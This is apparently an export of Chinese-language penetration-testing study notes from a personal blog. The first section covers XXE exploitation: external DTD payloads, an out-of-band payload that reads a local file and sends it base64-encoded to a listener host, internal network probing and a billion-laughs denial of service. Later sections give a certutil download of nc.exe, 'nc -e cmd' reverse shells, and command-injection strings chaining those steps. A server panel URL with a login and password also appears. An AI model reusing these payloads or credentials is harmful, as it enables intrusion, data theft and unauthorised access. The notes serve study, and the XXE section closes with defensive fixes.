src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530113612099.png" alt="image-20240530113612099"></p><p>规范中，还说到：“但可以在同级别中被当作标记语言调用” ，就像是参数实体的引用，就是将调用当成了一个标记语言，也就是我们前面说的需要在DTD中单独调用，像这样：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530113618932.png" alt="image-20240530113618932"></p><p>也就是我们所构造的payload这种使用方式，不能在内部DTD中被这样使用，但是幸运的是，XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530113636226.png" alt="image-20240530113636226"></p><p>这就要求我们作为攻击者，需要有一台服务器来提供外部的恶意DTD文件的读取，我们实验环境中就用一个机器来同时作为攻击机和受害机，效果一样的。</p><p>DTD文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY evil &quot;%start;%xxe;%end;&quot; &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % all SYSTEM &quot;http://192.168.0.3/evil.dtd&quot;&gt;</span><br><span class="line">   %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;evil;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530114154563.png" alt="image-20240530114154563"></p><p>这是因为，漏洞示例代码中的打印函数选的不好，print_r()函数在遇到这种内容中有导致标签闭合的字符串时，就会返回出空的SimpleXMLElement对象。我们可以做如下测试，编辑如下php代码（已经存在于step2路径下print_test.php和网站根目录下index.php）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">##echo &quot;Hello World&quot;;</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="string">&lt;&lt;&lt;XML</span></span><br><span class="line"><span class="string">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">   &lt;!ENTITY start &quot;&lt;![CDATA[&#x27;&lt;&gt;!@#!$&#x27;]]&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;start;&lt;/root&gt;</span></span><br><span class="line"><span class="string">XML</span>;</span><br><span class="line"><span class="variable">$xxe_</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$xxe_</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xxe_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------------------------&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xxe_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530114316095.png" alt="image-20240530114316095"></p><p>可见，唯独print_r()，没有输出这些特殊的字符串。这种情况，如果漏洞代码中使用的是echo，就可以输出了。感兴趣的同学可以自己修改代码来验证。</p><p>Ps：</p><p>由于环境资源的关系，我们在进行攻击时，所使用的外部dtd文件，是本地环境的。但是在实际的攻击情况下，这个DTD文件应该是我们自己所掌握的主机的DTD文件，文件的内容是受我们所控的。</p><h3 id="无回显的本地文件读取"><a href="#无回显的本地文件读取" class="headerlink" title="无回显的本地文件读取"></a>无回显的本地文件读取</h3><p>（OOB out-of-band 外带参数实体注入）</p><p>在实际情况中，大多数情况下服务器上的 XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据</p><p>先看一下漏洞示例（已经在桌面demo&#x2F;PHP_XML&#x2F;step3&#x2F;out_xxe.php和网站根目录下out_xxe.php）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相较于前面有回显的漏洞代码，主要功能没有大的变化，但是代码中没有内容输出的部分。这样，用之前的payload就没有作用了（当然这个任务中的漏洞示例代码，加个输出，也同样适用于前面的任务）。</p><p>那么怎样才能成功读取到内容呢，我们可以这样进行Payload的构造：</p><p>有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：</p><p>我们可以在本地做一个端口监听，然后利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口，这样，我们只需要查看请求的url就可以知道读取到的内容是什么。</p><p>首先，我们使用ncat监听一个端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ncat -lvvp 3333</span><br></pre></td></tr></table></figure><p>然后，我们构造payload：</p><p>我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件（实验环境中，就是我们所使用的这台机器），我在这里命名为evil_xxe.dtd：</p><p>(已经在桌面demo&#x2F;PHP_XML&#x2F;step3&#x2F;evil_xxe.dtd和网站根目录下evil_xxe.dtd)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/Users/Administrator/Desktop/xmlerror.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.0.3:3333/?%xxe;&#x27;&gt;&quot;&gt;</span><br><span class="line">%dtd;</span><br></pre></td></tr></table></figure><p>第一个参数实体的声明中使用到了php的伪协议，将需要读取的内容进行base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。</p><p>然后第二个参数实体，对我们监听的主机和端口进行访问，并将读取到的参数实体xxe的内容作为请求的参数。</p><p>这样，Payload就会很简单了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root SYSTEM &quot;http://192.168.0.3/evil_xxe.dtd&quot;&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>bp抓包,加入payload</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530115304630.png" alt="image-20240530115304630"></p><p>然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530115450922.png" alt="image-20240530115450922"></p><p>Ps：</p><p>有时候也会出现报错的情况，一方面我们在漏洞的代码中没有屏蔽错误和警告，另一方面如果我们监听的端口失效，当目标服务器尝试访问我们监听的端口，但失败的时候，就会爆出错误和警告，但是也可以从爆出的警告中看到我们需要的信息。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530115518077.png" alt="image-20240530115518077"></p><h3 id="XXE其他利用方式"><a href="#XXE其他利用方式" class="headerlink" title="XXE其他利用方式"></a>XXE其他利用方式</h3><p>当然进行内网探测我们还需要做一些准备工作，就是获取目标主机在内网中的IP地址，或是内网的网络划分信息，我们可以先利用 file 协议读取我们作为跳板服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 等跟内网配置有关的文件，我们可以通过这些文件的内容来获取更多有关内网的信息。</p><p>如果实在没有办法获取目标主机的内网配置相关信息，，，那就花费时间爆破吧。</p><p><strong>内网存活主机探测：</strong></p><p>如下，其实payload就是简单的一个外部实体的注入payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root SYSTEM &quot;http://192.168.0.3/&quot;&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530115905642.png" alt="image-20240530115905642"></p><p>只不过是将http:&#x2F;&#x2F;后面的部分替换为目标主机，这样当目标主机存活时，如果80端口没有对应的服务，那么很快就会i发现警告信息，如上图。</p><p>那如果目标主机不存在，那么我们所利用的XXE漏洞的服务器，就会花费一些时间在网络总寻找目标主机，直到超时。如下图：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530120058731.png" alt="image-20240530120058731"></p><p>如果觉得手动的探测慢的话，当然可以自己编写一个脚本来进行自动探测，将没有超时的主机记录下来即可。</p><p><strong>内网主机端口探测：</strong></p><p>同样的，根据内网存活主机的扫描方式，我们也可以针对某个主机进行端口的扫描。但是端口的探测准确性比较低，判断的标准也不一样。由于环境的不同，版本的不同，你可能会遇到任何一个端口的返回都是200状态码和警告信息以及我们期望输出的字符串，那么这个时候哪些端口是打开的，哪些端口是关闭的，就需要你自己去判断了。</p><h2 id="通过XXE漏洞进行命令执行（非本实验重点）"><a href="#通过XXE漏洞进行命令执行（非本实验重点）" class="headerlink" title="通过XXE漏洞进行命令执行（非本实验重点）"></a><strong>通过XXE漏洞进行命令执行（非本实验重点）</strong></h2><p>这种情况比较少见，所需的前提条件除了真实存在XXE漏洞外，大概还需要：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; 目标系统为Linux系统</span><br><span class="line">b&gt; 目标系统成功安装PHP的expect扩展</span><br></pre></td></tr></table></figure><p>而且这个漏洞所执行的命令也有限制：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; 可执行的命令与当前用户的权限大小有关</span><br><span class="line">b&gt; 命令中不能有空格，否则会报错</span><br></pre></td></tr></table></figure><p>一般情况下payload（实验环境限制，我们的环境时windows环境，没有进行测试，大家可以在自己的本地搭建Linux环境测试）：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530120038746.png" alt="image-20240530120038746"></p><h4 id="通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。"><a href="#通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。" class="headerlink" title="通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。"></a><strong>通过XXE漏洞进行DOS攻击<strong><strong>（不要轻易尝试，当然，也可能现在已经没有效果了）</strong></strong>。</strong></h4><p>Payload如下：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530120031896.png" alt="image-20240530120031896"></p><p>上面的payload就是著名的“billion laughs”攻击，该代码可以在目标主机的内存中生成十亿个“lol”字符串，从而导致 Dos攻击。它也被称为指数实体扩展攻击，是一种名副其实的XML炸弹。原理为：通过创建一项递归的 XML 定义，构造恶意的XML实体文件耗尽可用内存，如以上代码所示，在XMl中定义了一个实体lol9，它的值包含了十个实体lol8的值，而每个lol8又包含了十个lol7的值…最后产生10亿个“lol”字符串，占用内存约高达3GB。因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，这样，就会占用大量的内存资源，造成了拒绝服务器攻击。</p><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a><strong>方案一：</strong></h4><p>过滤用户输入的xml数据，比如尖括号，一些关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC等</p><h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a><strong>方案二：</strong></h4><p>禁用外部实体：</p><p>PHP：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xd</title>
      <link href="/2024/05/29/xd/"/>
      <url>/2024/05/29/xd/</url>
      
        <content type="html"><![CDATA[<h1 id="Day1-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#Day1-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="Day1:操作系统-名词-文件下载-反弹SHELL-防火墙绕过"></a>Day1:操作系统-名词-文件下载-反弹SHELL-防火墙绕过</h1><p><strong>前后端，POC&#x2F;ExP，Payload&#x2F;shellcode，后门&#x2F;webshe1l，木马&#x2F;病毒反弹，回显，跳板（科学上网），黑白盒测试（不知道&#x2F;知道源代码），暴力解，社会工程学，撞库，ATT&amp;CK]<a href="https://attack.mitre.org/%E7%AD%89%E5%8F%82%E8%80%83">https://attack.mitre.org/等参考</a>:</strong></p><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p><a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p><p>术语解释：<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p><h2 id="1-渗透测试常用专业术语"><a href="#1-渗透测试常用专业术语" class="headerlink" title="1.渗透测试常用专业术语"></a>1.渗透测试常用专业术语</h2><h3 id="1-1-POC、EXP、Payload与Shellcode"><a href="#1-1-POC、EXP、Payload与Shellcode" class="headerlink" title="1.1. POC、EXP、Payload与Shellcode"></a>1.1. POC、EXP、Payload与Shellcode</h3><blockquote><p>POC:全称’ProofofConcept’，中文’概念验证”，常指一段漏洞证明的代码。</p><p>EXP:全称’Exploit”，中文‘利用’，指利用系统漏洞进行攻击的动作。</p><p>Payload:中文’有效载荷’，指成功exploit之后，真正在目标系统执行的代码或指令</p><p>shellcode:简单翻译”shell代码’，是Payioad的一种，由于其建立正向&#x2F;反向shell而得名</p></blockquote><p><strong>注意：</strong></p><ol><li>POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Ep通常是有害的，有了POC，才有EXP。</li><li>Payload有很多种，它可以是Shelcde，也可以直接是一段系统命令。同一个Payoad可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP</li><li>Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</li></ol><h3 id="基础案例1"><a href="#基础案例1" class="headerlink" title="#基础案例1:"></a>#基础案例1:</h3><p><strong>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</strong></p><ul><li>1、个人计算机&amp;服务器用机</li><li>2、windows&amp;Linux常见命令</li><li>3、文件权限&amp;服务权限&amp;用户权限等</li><li>4、系统用户&amp;用户组&amp;服务用户等分类</li><li>5、自带防火墙出站&amp;入站规则策略协议</li></ul><h3 id="实用案例1"><a href="#实用案例1" class="headerlink" title="#实用案例1:"></a>#实用案例1:</h3><p><strong>文件上传下载-解决无图形化&amp;解决数据传输</strong><br>Linux:wget curl python ruby perl java等</p><p>Windows: PowerShell Certutil Bitsadmin msiexec mshta rundl132</p><p>在服务器上准备好nc.exe</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318173257483.png" alt="image-20240318173257483"></p><p>再通过访问该地址，下载nc到本机</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318173450975.png" alt="image-20240318173450975"></p><p>或者用curl命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http:192.168.174.143/nc/nc.exe -o nc2.exe</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318173743501.png"></p><h3 id="实用案例2"><a href="#实用案例2" class="headerlink" title="#实用案例2:"></a>#实用案例2:</h3><p><strong>反弹shell命令-解决数据回显&amp;解决数据通讯</strong></p><p>useradd 用户名 passwd 用户名</p><p>测试linux系统添加用户或修改密码命令交互回显问题</p><p> 这里我一个用windows10作为本机，centos7作为服务器</p><p>windows：192.168.174.143</p><p>centos：192.168.174.142</p><p>首先在centos设置监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure><p>然后在windows10用nc把cmd弹过来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e cmd 192.168.174.142</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318191948435.png" alt="image-20240318191948435"></p><p>也能成功就是会乱码</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318192011869.png" alt="image-20240318192011869"></p><p>如果是虚拟机就把cmd改为&#x2F;bin&#x2F;bash</p><p>但这个只是在内网的情况下，如果需要连接外网，我们需要用到路由的端口转，详细见Day2</p><h3 id="结合案例1"><a href="#结合案例1" class="headerlink" title="#结合案例1:"></a>#结合案例1:</h3><p>防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</p><p>1、内网:<br>内网 -&gt; 服务器</p><p>服务器!-&gt;内网</p><p>2、防火墙:<br>服务器&lt;-&gt; aliyun</p><p>服务器防火墙-&gt; aliyun</p><p>aliyun !-&gt; 服务器防火墙</p><p>关键就是防火墙会拒绝外部进来的数据，所以内部就监听不到东西，这时候如果把windows给到服务器，这时候就变成出站了，限制就没那么严格</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318193645056.png" alt="image-20240318193645056"></p><p>正向，就是我主动找你，把我的cmd给你</p><p>反向，对方来找我，把它的cmd给我</p><p>对windows来说是正向，对linux是反向，因为是windows找linux，要看是以谁为参照物</p><h3 id="结合案例2"><a href="#结合案例2" class="headerlink" title="#结合案例2:"></a>#结合案例2:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#python2一句话服务器</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">#python3</span><br><span class="line">python -m Http.server 8080</span><br></pre></td></tr></table></figure><p><strong>学会了有手就行-Fofa拿下同行Pikachu服务器</strong></p><p>这个没有自己的服务器，没办法上传，就本地的靶场试试</p><p>文件下载&amp;反弹she11:<br>certutil -urlcache -split -f <a href="http://192.168.174.143/nc/nc.exe">http://192.168.174.143/nc/nc.exe</a> nc -e cmd 192.168.174.142 5566</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318201521348.png" alt="image-20240318201521348"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; certutil -urlcache -split -f http://192.168.174.143/nc/nc.exe</span><br><span class="line">127.0.0.1 &amp; dir</span><br><span class="line">127.0.0.1 &amp; nc -e cmd 192.168.174.142 5566</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318202023597.png" alt="image-20240318202023597"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318202040571.png" alt="image-20240318202040571"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240318202107378.png" alt="image-20240318202107378"></p><h1 id="Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="Day2:Web应用_架构搭建_漏洞_HTTP数据包_代理服务器"></a>Day2:Web应用_架构搭建_漏洞_HTTP数据包_代理服务器</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="#知识点:"></a>#知识点:</h2><ol><li>网站搭建前置知识</li><li>WEB应用环境架构类</li><li>WEB应用安全漏洞分类</li><li>WEB请求返回过程数据包</li></ol><h2 id="网站搭建前置知识"><a href="#网站搭建前置知识" class="headerlink" title="#网站搭建前置知识"></a>#网站搭建前置知识</h2><p>域名，子域名，DNS，HTTP&#x2F;HTTPS，证书等</p><blockquote><p>一、什么是主域名？</p><p>主域名由两个或两个以上的字母构成，中间由点号隔开，整个域名通常只有1个点号。 百度的主域名是baidu.com。<br>二、什么是子域名？</p><p>子域名一般会根据站点不同性质在主域名前面加上不同的前缀构成，通常比主域名多一个点或两个点。只要在主域名前面加上前缀的都是该主域名的子域名，子域名又能分为二级子域名、三级子域名、还有多级子域名。 子域名会在主域名前面加上不同的前缀，通常比主域名多一个点或两个点。只要在主域名前面加上前缀的都是该主域名的子域名，子域名又能分为二级子域名、三级子域名、还有多级子域名。</p><p>例如：百度的二级域名（子域名）<a href="http://www.baidu.com/">www.baidu.com</a> 如1.<a href="http://www.baidu.com和2.www.baidu.com这样的三级域名也同样可以成为www.baidu.com和baidu.com的子域名./">www.baidu.com和2.www.baidu.com这样的三级域名也同样可以成为www.baidu.com和baidu.com的子域名。</a></p></blockquote><p><strong>国内的域名需要备案才能被访问，否则只有非大陆地区才能访问</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319181055521.png" alt="image-20240319181055521"></p><h3 id="一键部署Zblog"><a href="#一键部署Zblog" class="headerlink" title="一键部署Zblog"></a><strong>一键部署Zblog</strong></h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319225656061.png" alt="image-20240319225656061"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319230124584.png" alt="image-20240319230124584"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319230134261.png" alt="image-20240319230134261"></p><h2 id="WEB应用环境架构类"><a href="#WEB应用环境架构类" class="headerlink" title="#WEB应用环境架构类"></a>#WEB应用环境架构类</h2><p>理解不同WEB应用组成角色功能架构:</p><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等</p><p>开发语言:asp,php,aspx,jsp,java,python,ruby,go,html,javascript等</p><p>程序源码:根据开发语言分类;应用类型分类;开源CMS分类;开发框架分类等</p><p>中间件容器:IIS,Apache,Nginx,Tomcat,weblogic,Jboos,glasshfish等</p><p>数据库类型:Access,Mysql,Mssql,0racle,db2,Sybase,Redis,MongoDB等</p><p>服务器操作系统:windows系列，Linux系列，Mac系列等</p><p>第三方软件:phpmyadmin,vs-ftpd,VNC，chibpenssh等</p><h2 id="WEB应用安全漏洞分类"><a href="#WEB应用安全漏洞分类" class="headerlink" title="#WEB应用安全漏洞分类"></a>#WEB应用安全漏洞分类</h2><p>SQL注入，文件安全，RCE执行，Xss跨站，CSRF&#x2F;SSRF&#x2F;CRLF，反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p><blockquote><p>面板地址:<a href="http://60.205.125.117:8888/3d189822">http://60.205.125.117:8888/3d189822</a><br>用户名:msdiqfwn<br>密码:c10a904a</p></blockquote><h2 id="WEB请求返回过程数据包参考"><a href="#WEB请求返回过程数据包参考" class="headerlink" title="#WEB请求返回过程数据包参考"></a>#WEB请求返回过程数据包参考</h2><p><a href="https://www.jianshu.com/p/558455228c43">https://www.jianshu.com/p/558455228c43</a></p><p><a href="https://www.cnblogs.com/cherrycui/p/10815465.html">https://www.cnblogs.com/cherrycui/p/10815465.html</a></p><p>请求数据包，请求方法，请求体，响应包，响应头，状态码，代理服务器等</p><p>Request,Response,User-Agent,Cookie,Server,Content-Length等</p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>架构-Web应用搭建-域名源码解析</p><p>请求包-新闻回帖点赞-重放数据包</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319205949190.png" alt="image-20240319205949190"></p><p>点赞抓包，发送到重放模块</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319210012855.png" alt="image-20240319210012855"></p><p>不断发送，使得本来只能点一次的赞，能够点多次</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319210241684.png" alt="image-20240319210241684"></p><p>请求包-移动端&amp;PC访问-自定义UA头</p><p>这里我们分别用电脑和手机模拟器访问bing搜索</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">电脑</span><br><span class="line">GET /?mkt=zh-CN&amp;mkt=zh-CN HTTP/1.1</span><br><span class="line">Host: www.bing.com</span><br><span class="line">...</span><br><span class="line">User-Agent: Mozilla/5.0 (<span class="strong">**Windows NT 10.0**</span>; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<span class="emphasis">*/*</span>;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://cn.bing.com/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">手机</span><br><span class="line">Mozilla/5.0 (Linux; <span class="strong">**Android**</span> 7.1.2; HD1900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36</span><br></pre></td></tr></table></figure><p>可以看到他会显示不同的系统,然后可以通过替换这个User-Agent来实现在电脑端访问手机端样式的界面</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319222851169.png" alt="image-20240319222851169"></p><p>返回包-网站文件目录扫描-返回状态码</p><p>文件夹 403 存在 404 不存在 </p><p>文件 200 存在 404 不存在</p><p>3xx 跳转 处置过程 判断可有可无</p><p>5xx 内部错误 服务器问题 判断可有可无</p><p>所以可以在bp里，设置如下参数，然后用列表等扫描</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319224355849.png" alt="image-20240319224355849"></p><p>然后根据状态码来确定是否存在</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240319224536900.png" alt="image-20240319224536900"></p><p>也是一种目录扫描的方法</p><p>数据包-WAF文件目录扫描-代理服务器</p><p>快代理<a href="https://www.kuaidaili.com/free/%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%AD%90%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E7%9A%84ip%E4%BD%8D%E7%BD%AE%E5%8F%98%E5%BE%97%E4%B8%8D%E7%A1%AE%E5%AE%9A%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E7%9A%84ip%E8%A2%AB%E6%8B%89%E9%BB%91%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%BF%99%E4%B8%AA%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%A7%A3%E5%86%B3">https://www.kuaidaili.com/free/，这样子可以让你的ip位置变得不确定，如果你的ip被拉黑可以通过这个方式来解决</a></p><h1 id="Day3-抓包-封包-协议-APP-小程序-PC应用-WEB应用"><a href="#Day3-抓包-封包-协议-APP-小程序-PC应用-WEB应用" class="headerlink" title="Day3:抓包 封包 协议 APP 小程序 PC应用 WEB应用"></a>Day3:抓包 封包 协议 APP 小程序 PC应用 WEB应用</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="#知识点:"></a>#知识点:</h2><ul><li>抓包技术应用意义</li><li>抓包技术应用对象</li><li>抓包技术应用协议</li><li>抓包技术应用支持</li><li>封包技术应用意义</li><li>总结点:学会不同对象采用不同抓包封包抓取技术分析</li></ul><p>基于网络接口抓包-网络接口</p><p>基于程序进程抓包-程序进程</p><p>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP</p><p>基于应用对象抓包-APP&amp;小程序&amp;PC UI</p><p>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p><h3 id="win10激活"><a href="#win10激活" class="headerlink" title="win10激活"></a>win10激活</h3><figure 